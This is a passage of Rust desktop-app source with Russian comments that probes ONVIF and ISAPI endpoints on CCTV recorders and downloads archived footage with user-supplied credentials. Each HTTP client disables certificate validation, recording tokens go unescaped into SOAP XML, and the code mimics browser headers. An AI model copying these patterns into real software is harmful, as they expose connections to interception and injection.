        format!("http://{}:80/onvif/recording_service", clean_host),
        format!("http://{}:8080/onvif/recording_service", clean_host),
        format!("https://{}:443/onvif/recording_service", clean_host),
        format!("https://{}:8443/onvif/recording_service", clean_host),
    ];

    let soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trc="http://www.onvif.org/ver10/recording/wsdl">
  <s:Body>
    <trc:GetRecordings/>
  </s:Body>
</s:Envelope>"#;

    let token_re =
        Regex::new(r"<[^>]*RecordingToken[^>]*>([^<]+)</[^>]+>").map_err(|e| e.to_string())?;

    push_runtime_log(
        &log_state,
        format!("ONVIF recordings search started for {}", clean_host),
    );

    for endpoint in endpoints {
        let resp = client
            .post(&endpoint)
            .header("Content-Type", "application/soap+xml; charset=utf-8")
            .basic_auth(login.clone(), Some(pass.clone()))
            .body(soap.to_string())
            .send()
            .await;

        match resp {
            Ok(r) => {
                if !r.status().is_success() && r.status().as_u16() != 401 {
                    continue;
                }
                let text = r.text().await.unwrap_or_default();
                let mut out = Vec::new();
                for cap in token_re.captures_iter(&text) {
                    if let Some(m) = cap.get(1) {
                        out.push(OnvifRecordingItem {
                            endpoint: endpoint.clone(),
                            token: m.as_str().trim().to_string(),
                        });
                    }
                }

                if !out.is_empty() {
                    push_runtime_log(
                        &log_state,
                        format!(
                            "ONVIF recordings search finished for {} via {} (tokens: {})",
                            clean_host,
                            endpoint,
                            out.len()
                        ),
                    );
                    return Ok(out);
                }
            }
            Err(_) => {}
        }
    }

    push_runtime_log(
        &log_state,
        format!("ONVIF recordings search unavailable for {}", clean_host),
    );
    Err("ONVIF recording_service недоступен или не вернул recording tokens".into())
}

async fn probe_archive_export_endpoints(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<Vec<ArchiveEndpointResult>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для проверки endpoint экспорта".into());
    }

    push_runtime_log(
        &log_state,
        format!("Archive endpoint probe started for {}", clean_host),
    );

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let candidates: Vec<(String, String, String)> = vec![
        (
            "ISAPI".into(),
            "GET".into(),
            format!("http://{}:80/ISAPI/ContentMgmt/search", clean_host),
        ),
        (
            "ISAPI".into(),
            "GET".into(),
            format!("http://{}:80/ISAPI/ContentMgmt/record/tracks", clean_host),
        ),
        (
            "ISAPI".into(),
            "GET".into(),
            format!("https://{}:443/ISAPI/ContentMgmt/search", clean_host),
        ),
        (
            "ISAPI".into(),
            "GET".into(),
            format!("https://{}:443/ISAPI/ContentMgmt/record/tracks", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("http://{}:80/onvif/recording_service", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("http://{}:8080/onvif/recording_service", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("https://{}:443/onvif/recording_service", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("https://{}:8443/onvif/recording_service", clean_host),
        ),
    ];

    let onvif_probe_soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trc="http://www.onvif.org/ver10/recording/wsdl">
  <s:Body>
    <trc:GetRecordings/>
  </s:Body>
</s:Envelope>"#;

    let mut out = Vec::with_capacity(candidates.len());

    for (protocol, method, endpoint) in candidates {
        let resp = if method == "GET" {
            client
                .get(&endpoint)
                .basic_auth(login.clone(), Some(pass.clone()))
                .send()
                .await
        } else {
            client
                .post(&endpoint)
                .header("Content-Type", "application/soap+xml; charset=utf-8")
                .basic_auth(login.clone(), Some(pass.clone()))
                .body(onvif_probe_soap.to_string())
                .send()
                .await
        };

        let item = match resp {
            Ok(r) => {
                let code = r.status().as_u16();
                let status = if code == 200 || code == 401 || code == 405 {
                    "detected"
                } else {
                    "not_detected"
                };
                ArchiveEndpointResult {
                    protocol,
                    endpoint,
                    method,
                    status: status.into(),
                    status_code: Some(code),
                }
            }
            Err(_) => ArchiveEndpointResult {
                protocol,
                endpoint,
                method,
                status: "unreachable".into(),
                status_code: None,
            },
        };

        out.push(item);
    }

    let detected = out.iter().filter(|x| x.status == "detected").count();
    push_runtime_log(
        &log_state,
        format!(
            "Archive endpoint probe finished for {} (detected: {})",
            clean_host, detected
        ),
    );

    Ok(out)
}

#[tauri::command]
async fn download_onvif_recording_token(
    endpoint: String,
    recording_token: String,
    login: String,
    pass: String,
    filename_hint: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    if endpoint.trim().is_empty() {
        return Err("Пустой endpoint для ONVIF download".into());
    }
    if recording_token.trim().is_empty() {
        return Err("Пустой recording_token".into());
    }

    let task_key = task_id.unwrap_or_else(|| format!("onvif_{}", Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    push_runtime_log(
        &log_state,
        format!(
            "ONVIF download requested: token {} via {} [task:{}]",
            recording_token, endpoint, task_key
        ),
    );

    let soap = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trp="http://www.onvif.org/ver10/replay/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema">
  <s:Body>
    <trp:GetReplayUri>
      <trp:StreamSetup>
        <tt:Stream>RTP-Unicast</tt:Stream>
        <tt:Transport>
          <tt:Protocol>RTSP</tt:Protocol>
        </tt:Transport>
      </trp:StreamSetup>
      <trp:RecordingToken>{}</trp:RecordingToken>
    </trp:GetReplayUri>
  </s:Body>
</s:Envelope>"#,
        recording_token
    );

    let client = reqwest::Client::builder()
        .connect_timeout(Duration::from_secs(10))
        .timeout(Duration::from_secs(600))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let replay_resp = client
        .post(&endpoint)
        .header("Content-Type", "application/soap+xml; charset=utf-8")
        .basic_auth(login.clone(), Some(pass.clone()))
        .body(soap)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    let replay_body = replay_resp.text().await.map_err(|e| e.to_string())?;
    let uri_re = Regex::new(r"<[^>]*Uri[^>]*>([^<]+)</[^>]+>").map_err(|e| e.to_string())?;
    let replay_uri = uri_re
        .captures(&replay_body)
        .and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string()))
        .ok_or_else(|| "ONVIF replay URI не найден в ответе GetReplayUri".to_string())?;

    push_runtime_log(
        &log_state,
        format!("ONVIF replay URI resolved for token {}", recording_token),
    );

    let replay_uri_lc = replay_uri.to_ascii_lowercase();
    if replay_uri_lc.starts_with("rtsp://") || replay_uri_lc.starts_with("rtsps://") {
        push_runtime_log(
            &log_state,
            format!(
                "ONVIF replay URI for token {} is RTSP, starting ffmpeg capture: {}",
                recording_token, replay_uri
            ),
        );

        let mut filename = filename_hint
            .clone()
            .map(|s| sanitize_filename_component(&s))
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| format!("onvif_record_{}.mp4", Utc::now().timestamp()));
        if !filename.contains('.') {
            filename.push_str(".mp4");
        }

        let path = get_vault_path()
            .join("archives")
            .join("onvif")
            .join(&filename);
        let _ = std::fs::create_dir_all(path.parent().unwrap());

        let output_path = path.to_string_lossy().to_string();
        let mut child = Command::new("ffmpeg")
            .args([
                "-y",
                "-rtsp_transport",
                "tcp",
                "-i",
                &replay_uri,
                "-c",
                "copy",
                &output_path,
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|e| format!("Не удалось запустить ffmpeg для ONVIF RTSP: {}", e))?;

        let started = std::time::Instant::now();
        let mut last_progress_log = std::time::Instant::now();
        let mut last_size: u64 = 0;
        loop {
            if cancel_state
                .cancelled_tasks
                .lock()
                .map(|set| set.contains(&task_key))
                .unwrap_or(false)
            {
                let _ = child.kill();
                let _ = std::fs::remove_file(&path);
                if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                    cancelled.remove(&task_key);
                }
                push_runtime_log(
                    &log_state,
                    format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
                );
                return Err(format!(
                    "Загрузка отменена пользователем [task:{}]",
                    task_key
                ));
            }

            match child.try_wait() {
                Ok(Some(status)) => {
                    if !status.success() {
                        let stderr_preview = if let Some(mut stderr) = child.stderr.take() {
                            use std::io::Read;
                            let mut buf = String::new();
                            let _ = stderr.read_to_string(&mut buf);
                            buf.lines()
                                .rev()
                                .take(5)
                                .collect::<Vec<_>>()
                                .into_iter()
                                .rev()
                                .collect::<Vec<_>>()
                                .join(" | ")
                        } else {
                            String::new()
                        };
                        let tail = if stderr_preview.is_empty() {
                            "нет stderr от ffmpeg".to_string()
                        } else {
                            format!("stderr: {}", stderr_preview)
                        };
                        return Err(format!(
                            "ffmpeg завершился с ошибкой: {} ({})",
                            status, tail
                        ));
                    }
                    break;
                }
                Ok(None) => {}
                Err(e) => return Err(format!("Ошибка ожидания ffmpeg: {}", e)),
            }

            if last_progress_log.elapsed() >= std::time::Duration::from_secs(1) {
                let current_size = std::fs::metadata(&path)
                    .map(|m| m.len())
                    .unwrap_or(last_size);
                if current_size > last_size {
                    push_runtime_log(
                        &log_state,
                        format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, current_size),
                    );
                    last_size = current_size;
                }
                last_progress_log = std::time::Instant::now();
            }

            if started.elapsed() > std::time::Duration::from_secs(180) {
                let _ = child.kill();
                let _ = child.wait();
                return Err("Таймаут ONVIF RTSP capture (180s)".into());
            }

            tokio::time::sleep(Duration::from_millis(300)).await;
        }

        let bytes_written = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
        let duration_ms = started.elapsed().as_millis();

        push_runtime_log(
            &log_state,
            format!(
                "DOWNLOAD_PROGRESS|{}|{}|{}",
                task_key, bytes_written, bytes_written
            ),
        );
        push_runtime_log(
            &log_state,
            format!(
                "ONVIF RTSP download finished: {} ({} bytes, {} ms) [task:{}]",
                filename, bytes_written, duration_ms, task_key
            ),
        );

        if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
            cancelled.remove(&task_key);
        }

        return Ok(DownloadReport {
            server_alias: "onvif".into(),
            filename,
            save_path: path.to_string_lossy().to_string(),
            bytes_written,
            total_bytes: bytes_written,
            duration_ms,
            resumed: false,
            skipped_as_complete: false,
        });
    }

    if !replay_uri_lc.starts_with("http://") && !replay_uri_lc.starts_with("https://") {
        return Err(format!("Неподдерживаемая схема replay URI: {}", replay_uri));
    }

    let started = std::time::Instant::now();
    let resp = client
        .get(&replay_uri)
        .basic_auth(login, Some(pass))
        .send()
        .await
        .map_err(|e| e.to_string())?;

    if !resp.status().is_success() {
        return Err(format!(
            "ONVIF download failed with HTTP {}",
            resp.status().as_u16()
        ));
    }

    let total_size = resp.content_length().unwrap_or(0);
    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("onvif_record_{}.mp4", Utc::now().timestamp()));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("onvif")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let mut stream = resp.bytes_stream();
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let progress_step = 2 * 1024 * 1024u64;
    let mut next_progress_mark = progress_step;

    while let Some(chunk) = stream.next().await {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = std::fs::remove_file(&path);
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(&task_key);
            }
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err(format!(
                "Загрузка отменена пользователем [task:{}]",
                task_key
            ));
        }

        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        bytes_written += data.len() as u64;

        if bytes_written >= next_progress_mark {
            push_runtime_log(
                &log_state,
                format!(
                    "DOWNLOAD_PROGRESS|{}|{}|{}",
                    task_key,
                    bytes_written,
                    total_size.max(bytes_written)
                ),
            );
            next_progress_mark += progress_step;
        }
    }

    let duration_ms = started.elapsed().as_millis();
    push_runtime_log(
        &log_state,
        format!(
            "ONVIF download finished: {} ({} bytes, {} ms) [task:{}]",
            filename, bytes_written, duration_ms, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    Ok(DownloadReport {
        server_alias: "onvif".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes: total_size.max(bytes_written),
        duration_ms,
        resumed: false,
        skipped_as_complete: false,
    })
}

async fn download_isapi_playback_uri(
    playback_uri: String,
    login: String,
    pass: String,
    source_host: Option<String>,
    filename_hint: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
    _ffmpeg_limiter: State<'_, FfmpegLimiterState>,
) -> Result<DownloadReport, String> {
    if playback_uri.trim().is_empty() {
        return Err("Пустой playback_uri".into());
    }

    let task_key = make_unique_task_key(task_id, "isapi");
    let started = std::time::Instant::now();

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("isapi_record_{}.mp4", Utc::now().timestamp()));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("isapi")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    push_runtime_log(
        &log_state,
        format!("ISAPI SMART GET: {} [task:{}]", filename, task_key),
    );

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(60))
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0")
        .build()
        .map_err(|e| e.to_string())?;

    let parsed = reqwest::Url::parse(&playback_uri).map_err(|e| format!("Bad URI: {}", e))?;

    // Приоритет endpoint-хоста: если frontend передал source_host (внешний/доступный адрес NVR),
    // используем его для HTTP download endpoint, а playback_uri оставляем как payload.
    let (host, port) = if let Some(src) = source_host
        .as_ref()
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
    {
        let normalized = if src.contains("://") {
            src.to_string()
        } else {
            format!("http://{}", src)
        };
        if let Ok(src_url) = reqwest::Url::parse(&normalized) {
            let h = src_url
                .host_str()
                .ok_or_else(|| "Bad source_host: empty host".to_string())?
                .to_string();
            let p = src_url.port().unwrap_or(2019);
            (h, p)
        } else {
            let mut parts = src.split(':');
            let h = parts.next().unwrap_or_default().trim();
            if h.is_empty() {
                return Err("Bad source_host: empty host".into());
            }
            let p = parts
                .next()
                .and_then(|x| x.parse::<u16>().ok())
                .unwrap_or(2019);
            (h.to_string(), p)
        }
    } else {
        let h = parsed
            .host_str()
            .ok_or_else(|| "Bad URI: empty host".to_string())?
            .to_string();
        let p = parsed.port().unwrap_or(2019);
        (h, p)
    };

    let request_path = "/ISAPI/ContentMgmt/download";

    // 🔥 ХИРУРГИЯ: Мимикрия под браузер. Форматируем вложенный playbackURI как у штатного web-ui.
    let mut clean_uri = playback_uri.replace("&amp;", "&");
    if let Ok(mut parsed_inner) = reqwest::Url::parse(&clean_uri) {
        let _ = parsed_inner.set_port(None); // строгие прошивки отвергают playbackURI с портом
        let _ = parsed_inner.set_username("");
        let _ = parsed_inner.set_password(None);

        let mut query_pairs = Vec::new();
        for (k, v) in parsed_inner.query_pairs() {
            let mut val = v.to_string();
            if k == "starttime" || k == "endtime" {
                let ct = val
                    .replace('-', "")
                    .replace(':', "")
                    .replace("%20", " ")
                    .replace(' ', "T");
                if ct.len() >= 15 {
                    val = format!(
                        "{}-{}-{} {}:{}:{}Z",
                        &ct[0..4],
                        &ct[4..6],
                        &ct[6..8],
                        &ct[9..11],
                        &ct[11..13],
                        &ct[13..15]
                    );
                }
            }
            query_pairs.push((k.into_owned(), val));
        }

        parsed_inner.query_pairs_mut().clear();
        for (k, v) in query_pairs {
            parsed_inner.query_pairs_mut().append_pair(&k, &v);
        }
        clean_uri = parsed_inner.to_string();
    }

    // Камеры часто принимают только «сырой» playbackURI без %-кодирования: повторяем поведение web-ui.
    let request_url = format!(
        "http://{}:{}{}?playbackURI={}&onlyVerification=true",
        host, port, request_path, clean_uri
    );

    // Fallback для OEM/Novicam: некоторые прошивки принимают только «кривой» web-ui формат
    // c разделителем `&amp;` внутри playbackURI (вплоть до параметров вида amp;endtime).
    let legacy_amp_playback_uri = reqwest::Url::parse(&clean_uri).ok().map(|u| {
        let mut base = format!(
            "{}://{}{}",
            u.scheme(),
            u.host_str().unwrap_or_default(),
            u.path()
        );
        let pairs: Vec<(String, String)> = u
            .query_pairs()
            .map(|(k, v)| {
                let mut vv = v.to_string().replace('+', "%20").replace(' ', "%20");
                if k == "starttime" || k == "endtime" {
                    vv = vv.replace('+', "%20");
                }
                (k.into_owned(), vv)
            })
            .collect();
        if !pairs.is_empty() {
            let mut q = String::new();
            for (i, (k, v)) in pairs.iter().enumerate() {
                if i > 0 {
                    q.push_str("&amp;");
                }
                q.push_str(k);
                q.push('=');
                q.push_str(v);
            }
            base.push('?');
            base.push_str(&q);
        }
        base
    });
    let legacy_request_url = legacy_amp_playback_uri.map(|legacy_uri| {
        format!(
            "http://{}:{}{}?playbackURI={}&onlyVerification=true",
            host, port, request_path, legacy_uri
        )
    });

    // ActiveX fallback: некоторые OEM принимают только GET с XML-телом (нестандартно).
    let mut activex_playback_uri = clean_uri.clone();
    if let Ok(mut parsed_uri) = reqwest::Url::parse(&activex_playback_uri) {
        let _ = parsed_uri.set_host(Some(&host));
        let _ = parsed_uri.set_port(None);
        activex_playback_uri = parsed_uri.to_string();
    }
    activex_playback_uri = activex_playback_uri
        .replace("T", "%20")
        .replace("&", "&amp;");
    let activex_xml_payload = format!(
        "<?xml version='1.0'?>\r\n<downloadRequest><playbackURI>{}</playbackURI></downloadRequest>",
        activex_playback_uri
    );
    let activex_request_url = format!("http://{}:{}{}", host, port, request_path);

    let mut current_offset = 0u64;
    let mut total_size = 0u64;
    let mut retries: u8 = 0;
    let mut use_legacy_amp_mode = false;
    let mut use_activex_xml_mode = false;
    let mut digest_cache: Option<String> = None;

    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&path)
        .map_err(|e| e.to_string())?;
    let progress_step = 2 * 1024 * 1024u64;
    let mut next_mark = progress_step;

    struct HeartbeatGuard(Option<tokio::task::JoinHandle<()>>);
    impl Drop for HeartbeatGuard {
        fn drop(&mut self) {
            if let Some(task) = self.0.take() {
                task.abort();
            }
        }
    }

    let heartbeat_client = client.clone();
    let heartbeat_url = format!("http://{}:{}/ISAPI/Security/sessionHeartbeat", host, port);
    let heartbeat_fallback_url = format!("http://{}:{}/ISAPI/System/deviceInfo", host, port);
    let heartbeat_origin = format!("http://{}:{}", host, port);
    let heartbeat_referer = format!("http://{}:{}/doc/page/playback.asp", host, port);
    let heartbeat_login = login.clone();
    let heartbeat_pass = pass.clone();
    let heartbeat_request_path = "/ISAPI/Security/sessionHeartbeat".to_string();
    let _heartbeat_guard = HeartbeatGuard(Some(tokio::spawn(async move {
        let mut digest_challenge: Option<String> = None;
        loop {
            tokio::time::sleep(Duration::from_secs(25)).await;

            let mut hb_req = heartbeat_client
                .put(&heartbeat_url)
                .header("X-Requested-With", "XMLHttpRequest")
                .header("Accept", "*/*")
                .header("Origin", heartbeat_origin.clone())
                .header("Referer", heartbeat_referer.clone())
                .header(
                    "User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
                );

            if let Some(ref challenge) = digest_challenge {
                if let Ok(mut prompt) = digest_auth::parse(challenge) {
                    let mut ctx = digest_auth::AuthContext::new(
                        heartbeat_login.clone(),
                        heartbeat_pass.clone(),
                        heartbeat_request_path.clone(),
                    );
                    ctx.method = digest_auth::HttpMethod::PUT;
                    if let Ok(answer) = prompt.respond(&ctx) {
                        hb_req = hb_req.header("Authorization", answer.to_string());
                    }
                }
            }

            match hb_req.send().await {
                Ok(resp) => {
                    let code = resp.status().as_u16();
                    if code == 401 {
                        if let Some(auth) = resp
                            .headers()
                            .get(reqwest::header::WWW_AUTHENTICATE)
                            .and_then(|h| h.to_str().ok())
                        {
                            digest_challenge = Some(auth.to_string());
                        }
                    }
                }
                Err(_) => {
                    let _ = heartbeat_client
                        .get(&heartbeat_fallback_url)
                        .header("X-Requested-With", "XMLHttpRequest")
                        .header("Accept", "*/*")
                        .header("Referer", heartbeat_referer.clone())
                        .send()
                        .await;
                }
            }
        }
    })));

    loop {
        if cancel_state
            .cancelled_tasks
            .lock()
            .unwrap()
            .contains(&task_key)
        {
            let _ = std::fs::remove_file(&path);
            return Err("Отменено".into());
        }

        let active_request_url = if use_activex_xml_mode {
            &activex_request_url
        } else if use_legacy_amp_mode {
            legacy_request_url.as_deref().unwrap_or(&request_url)
        } else {
            &request_url
        };
        let mut req = if use_activex_xml_mode {
            client
                .get(active_request_url)
                .header("User-Agent", "NS-HTTP/1.0")
                .header(
                    "Accept",
                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                )
                .header("Content-Type", "application/xml")
                .body(activex_xml_payload.clone())
        } else {
            client
                .get(active_request_url)
                .header("Accept", "*/*")
                .header("X-Requested-With", "XMLHttpRequest")
                .header(
                    "Referer",
                    format!(
                        "http://{}:{}/doc/page/download.asp?fileType=record",
                        host, port
                    ),
                )
        };
        if current_offset > 0 && !use_activex_xml_mode {
            req = req.header("Range", format!("bytes={}-", current_offset));
        }

        if let Some(ref auth) = digest_cache {
            if let Ok(mut prompt) = digest_auth::parse(auth) {
                let mut ctx = digest_auth::AuthContext::new(
                    login.clone(),
                    pass.clone(),
                    request_path.to_string(),
                );
                ctx.method = digest_auth::HttpMethod::GET;
                if let Ok(answer) = prompt.respond(&ctx) {
                    req = req.header("Authorization", answer.to_string());
                }
            }
        } else {
            req = req.basic_auth(&login, Some(&pass));
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                if status == 401 {
                    retries = retries.saturating_add(1);
                    if let Some(auth) = resp
                        .headers()
                        .get("WWW-Authenticate")
                        .and_then(|h| h.to_str().ok())
                    {
                        digest_cache = Some(auth.to_string());
                    }
                    if retries > 5 {
                        return Err("NVR HTTP Error 401 (Digest re-auth retries exceeded)".into());
                    }
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    continue;
                }
                if !resp.status().is_success() {
                    if status == 400 {
                        if !use_legacy_amp_mode {
                            if legacy_request_url.is_some() {
                                use_legacy_amp_mode = true;
                                retries = 0;
                                digest_cache = None;
                                push_runtime_log(
                                    &log_state,
                                    "ISAPI direct: switching to legacy amp; playbackURI mode",
                                );
                                tokio::time::sleep(Duration::from_millis(400)).await;
                                continue;
                            }
                        }
                        if !use_activex_xml_mode {
                            use_activex_xml_mode = true;
                            retries = 0;
                            digest_cache = None;
                            push_runtime_log(
                                &log_state,
                                "ISAPI direct: switching to ActiveX XML-body mode",
                            );
                            tokio::time::sleep(Duration::from_millis(400)).await;
                            continue;
                        }
                    }
                    if retries > 3 {
                        return Err(format!("NVR HTTP Error {}", status));
                    }
                    retries += 1;
                    tokio::time::sleep(Duration::from_secs(3)).await;
                    continue;
                }

                retries = 0;
                if total_size == 0 {
                    total_size = resp.content_length().unwrap_or(0) + current_offset;
                }

                use futures_util::StreamExt;
                let mut stream = resp.bytes_stream();
                while let Some(chunk) = stream.next().await {
                    if cancel_state
                        .cancelled_tasks
                        .lock()
                        .unwrap()
                        .contains(&task_key)
                    {
                        let _ = std::fs::remove_file(&path);
                        return Err("Отменено".into());
                    }
                    if let Ok(data) = chunk {
                        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
                        current_offset += data.len() as u64;
                        if current_offset >= next_mark {
                            push_runtime_log(
                                &log_state,
                                format!(
                                    "DOWNLOAD_PROGRESS|{}|{}|{}",
                                    task_key,
                                    current_offset,
                                    total_size.max(current_offset)
                                ),
                            );
                            next_mark = current_offset + progress_step;
                        }
                    } else {
                        break;
                    }
                }
                if current_offset >= total_size && total_size > 0 {
                    break;
                }
            }
            Err(e) => {
                if retries > 3 {
                    return Err(format!("Сбой сети: {}", e));
                }
                retries += 1;
                tokio::time::sleep(Duration::from_secs(3)).await;
            }
        }
    }

    push_runtime_log(
        &log_state,
        format!("ISAPI DOWNLOAD FINISHED: {} bytes", current_offset),
    );
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    Ok(DownloadReport {
        server_alias: "isapi_http".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written: current_offset,
        total_bytes: total_size.max(current_offset),
        duration_ms: started.elapsed().as_millis(),
        resumed: false,
        skipped_as_complete: false,
    })
}

async fn start_archive_export_job(
    playback_uri: String,
    login: String,
    pass: String,
    source_host: Option<String>,
    filename_hint: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
    ffmpeg_limiter: State<'_, FfmpegLimiterState>,
) -> Result<ArchiveExportJobResult, String> {
    if playback_uri.trim().is_empty() {
        return Err("Пустой playback_uri".into());
    }

    let task_key = task_id.unwrap_or_else(|| format!("export_{}", Utc::now().timestamp_millis()));
    let mut stages: Vec<ArchiveExportStage> = Vec::new();
    let fallback_duration = parse_archive_duration_from_uri(&playback_uri).or(Some(180));

    push_runtime_log(
        &log_state,
        format!("ARCHIVE_EXPORT|{}|stage=direct|status=started", task_key),
    );

    let direct_result = download_isapi_playback_uri(
        playback_uri.clone(),
        login.clone(),
        pass.clone(),
        source_host.clone(),
        filename_hint.clone(),
        Some(task_key.clone()),
        log_state.clone(),
        cancel_state.clone(),
        ffmpeg_limiter.clone(),
    )
    .await;

    let direct_failure_reason = match direct_result {
        Ok(report) => {
            stages.push(ArchiveExportStage {
                stage: "direct".into(),
                success: true,
                reason: None,
                save_path: Some(report.save_path.clone()),
                bytes_written: Some(report.bytes_written),
            });
            push_runtime_log(
                &log_state,
                format!("ARCHIVE_EXPORT|{}|stage=direct|status=done", task_key),
            );
            return Ok(ArchiveExportJobResult {
                task_id: task_key,
                final_status: "done".into(),
                selected_stage: "direct".into(),
                retry_count: 0,
                stage_count: stages.len(),
                fallback_duration_seconds: fallback_duration,
                final_reason: None,
                report: Some(report),
                stages,
            });
        }
        Err(err) => {
            stages.push(ArchiveExportStage {
                stage: "direct".into(),
                success: false,
                reason: Some(err.clone()),
                save_path: None,
                bytes_written: None,
            });
            push_runtime_log(
                &log_state,
                format!(
                    "ARCHIVE_EXPORT|{}|stage=direct|status=failed|reason={}",
                    task_key, err
                ),
            );
            err
        }
    };

    push_runtime_log(
        &log_state,
        format!("ARCHIVE_EXPORT|{}|stage=ffmpeg|status=started", task_key),
    );
    let fallback_result = capture_archive_segment(
        playback_uri,
        filename_hint,
        fallback_duration,
        None,
        Some(task_key.clone()),
        Some(login.clone()),
        Some(pass.clone()),
        log_state.clone(),
        cancel_state.clone(),
        ffmpeg_limiter.clone(),
    )
    .await;

    match fallback_result {
        Ok(report) => {
            stages.push(ArchiveExportStage {
                stage: "ffmpeg".into(),
                success: true,
                reason: None,
                save_path: Some(report.save_path.clone()),
                bytes_written: Some(report.bytes_written),
            });
            push_runtime_log(
                &log_state,
                format!("ARCHIVE_EXPORT|{}|stage=ffmpeg|status=done", task_key),
            );
            Ok(ArchiveExportJobResult {
                task_id: task_key,
                final_status: "done".into(),
                selected_stage: "ffmpeg".into(),
                retry_count: 1,
                stage_count: stages.len(),
                fallback_duration_seconds: fallback_duration,
                final_reason: Some(direct_failure_reason),
                report: Some(report),
                stages,
            })
        }
        Err(err) => {
            stages.push(ArchiveExportStage {
                stage: "ffmpeg".into(),
                success: false,
                reason: Some(err.clone()),
                save_path: None,
                bytes_written: None,
            });
            push_runtime_log(
                &log_state,
                format!(
                    "ARCHIVE_EXPORT|{}|stage=ffmpeg|status=failed|reason={}",
                    task_key, err
                ),
            );

            let final_reason = Some(format!(
                "direct: {} || ffmpeg: {}",
                direct_failure_reason, err
            ));

            Ok(ArchiveExportJobResult {
                task_id: task_key,
                final_status: "failed".into(),
                selected_stage: "none".into(),
                retry_count: 1,
                stage_count: stages.len(),
                fallback_duration_seconds: fallback_duration,
                final_reason,
                report: None,
                stages,
            })
        }
    }
}

/// RTSP ветка: скачивание через FFmpeg capture
/// Инжектит login:pass в RTSP URI и запускает FFmpeg
async fn download_isapi_via_rtsp(
    uri: &str,
    login: &str,
    pass: &str,
    filename_hint: Option<String>,
    task_key: &str,
    log_state: &State<'_, LogState>,
    cancel_state: &State<'_, DownloadCancelState>,
    ffmpeg_limiter: &State<'_, FfmpegLimiterState>,
) -> Result<DownloadReport, String> {
    push_runtime_log(log_state, format!("FFMPEG_SLOT_WAIT|{}|rtsp", task_key));
    let permit = ffmpeg_limiter
        .semaphore
        .clone()
        .acquire_owned()
        .await
